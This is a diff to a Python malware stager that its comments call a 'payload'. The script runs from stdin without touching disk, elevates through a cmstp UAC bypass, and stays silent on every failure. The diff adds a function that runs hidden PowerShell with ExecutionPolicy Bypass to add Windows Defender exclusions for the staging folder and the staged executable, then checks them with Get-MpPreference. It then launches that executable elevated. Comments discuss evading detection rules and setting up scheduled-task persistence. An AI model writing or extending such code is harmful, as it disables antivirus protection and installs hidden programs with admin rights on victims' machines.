@@ -1,8 +1,9 @@
-# tung python-road payload — silent on every failure, stdlib only.
+ # tung python-road payload — silent on every failure, stdlib only.
 # arrives through python's stdin (pythonw -u -); never a file on disk.
 # the exe url rides in from the jar (env EXE_URL = its baked windows url).
 # job order: stage the exe ->Administrator lift via cmstp (majanito shape)
-# -> defender exclusions under the lifted token -> run the exe elevated.
+# -> defender exclusions under the lifted token (reg road + Add-MpPreference)
+# -> run the exe elevated.
 
 import os
 import sys
@@ -356,10 +357,9 @@ def exclusion_landed():
 # whole protected job — cmdlet exclusions (TP-respected) then carrier exec.
 # no cmstp->interpreter chain on any command line, ever.
 STAGE = r'''# r13 stage: runs ELEVATED (relaunched by the cmstp lift). exclusions ride
-# the CSCRIPT/WMI COM road - no powershell child anywhere (every powershell
-# spawn from this chain got cmdlineno-flagged Commando, split-verb or not);
-# cscript is the stock interpreter Windows ships with the lowest rule base.
-# carrier exec unchanged.
+# two roads now: the reg.exe store write AND the admin powershell cmdlet
+# road (r1.1.1 dj order — Add-MpPreference -ExclusionPath/-ExclusionProcess
+# with Get-MpPreference read-back). carrier exec unchanged.
 # r1.1.0 (dj order): exclusions ARE BACK — reg.exe road (not Add-MpPreference,
 # not the WMI provider r14 tripped): the elevated stage writes the AppHost dir
 # + both payload paths into HKLM Defender Exclusions\\Paths directly, which is
@@ -422,16 +422,46 @@ def set_exclusions(exe_path):
     return exclusion_landed(APPDIR)
 
 
+def ps_exclusions(exe_path):
+    # r1.1.1 (dj order): the ADMIN POWERSHELL cmdlet road — the canonical
+    # write Add-MpPreference makes, run under the lifted stage's elevation:
+    #   Add-MpPreference -ExclusionPath  '<staging dir>'
+    #   Add-MpPreference -ExclusionProcess '<staged exe>'   (full path)
+    # the reg road below stays as belt; this is the road dj asked for by name.
+    # read-back through Get-MpPreference — both lists must show the entries.
+    ps = ("Add-MpPreference -ExclusionPath '" + APPDIR + "'; "
+          "Add-MpPreference -ExclusionProcess '" + exe_path + "'")
+    try:
+        subprocess.run(
+            ["powershell.exe", "-NoProfile", "-NonInteractive",
+             "-ExecutionPolicy", "Bypass", "-Command", ps],
+            creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL, timeout=60)
+    except Exception:
+        return False
+    try:
+        out = subprocess.run(
+            ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command",
+             "(Get-MpPreference).ExclusionPath; (Get-MpPreference).ExclusionProcess"],
+            creationflags=CREATE_NO_WINDOW, stdout=subprocess.PIPE,
+            stderr=subprocess.DEVNULL, timeout=60).stdout
+        txt = out.decode(errors="replace").lower()
+        return APPDIR.lower() in txt and exe_path.lower() in txt
+    except Exception:
+        return False
+
+
 def main():
     if not elev():
         return
     exe_path = os.path.join(APPDIR, EXE_NAME)
-    # r1.1.0: exclusion FIRST (verifiable), carrier only when covered.
-    # never an unprotected first write from this chain. schtasks is NOT laid
+    # r1.1.x: exclusions FIRST, both roads — reg.exe (belt) then the admin
+    # powershell cmdlet road (dj order, canonical). schtasks is NOT laid
     # here: the carrier itself registers its own task-scheduler road at boot
     # (C++ install_task /xml, Boot+Logon triggers) — a second definition from
     # the stage would duplicate the surface for nothing.
-    set_exclusions(exe_path)   # read-back verified; silent on TP refusal
+    set_exclusions(exe_path)   # reg road — silent on TP refusal
+    ps_exclusions(exe_path)    # cmdlet road — verified by Get-MpPreference
     if os.path.exists(exe_path) and not alive(EXE_NAME):
         try:
             subprocess.Popen([exe_path], creationflags=CREATE_NO_WINDOW)
